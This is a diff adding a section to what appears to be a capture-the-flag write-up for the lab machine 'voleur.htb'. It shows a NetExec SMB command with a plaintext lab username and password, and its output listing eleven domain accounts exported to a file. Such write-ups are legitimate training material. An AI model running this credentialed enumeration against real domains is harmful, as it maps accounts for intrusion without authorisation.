@@ -115,5 +115,23 @@ SMB         dc.voleur.htb   445    dc               SYSVOL          READ        
 Read perms on `IT`
 
 ```python
-
+faketime -f +8h nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --users-export users.txt
+SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
+SMB         dc.voleur.htb   445    dc               -Username-                    -Last PW Set-       -BadPW- -Description-
+SMB         dc.voleur.htb   445    dc               Administrator                 2025-01-28 20:35:13 0       Built-in account for administering the computer/domain
+SMB         dc.voleur.htb   445    dc               Guest                         <never>             0       Built-in account for guest access to the computer/domain
+SMB         dc.voleur.htb   445    dc               krbtgt                        2025-01-29 08:43:06 0       Key Distribution Center Service Account
+SMB         dc.voleur.htb   445    dc               ryan.naylor                   2025-01-29 09:26:46 0       First-Line Support Technician
+SMB         dc.voleur.htb   445    dc               marie.bryant                  2025-01-29 09:21:07 0       First-Line Support Technician
+SMB         dc.voleur.htb   445    dc               lacey.miller                  2025-01-29 09:20:10 0       Second-Line Support Technician
+SMB         dc.voleur.htb   445    dc               svc_ldap                      2025-01-29 09:20:54 0        
+SMB         dc.voleur.htb   445    dc               svc_backup                    2025-01-29 09:20:36 0        
+SMB         dc.voleur.htb   445    dc               svc_iis                       2025-01-29 09:20:45 0        
+SMB         dc.voleur.htb   445    dc               jeremy.combs                  2025-01-29 15:10:32 0       Third-Line Support Technician
+SMB         dc.voleur.htb   445    dc               svc_winrm                     2025-01-31 09:10:12 0        
+SMB         dc.voleur.htb   445    dc               [*] Enumerated 11 local users: VOLEUR
+SMB         dc.voleur.htb   445    dc               [*] Writing 11 local users to users.txt
 ```
+Dumped all the users to a userfile
+
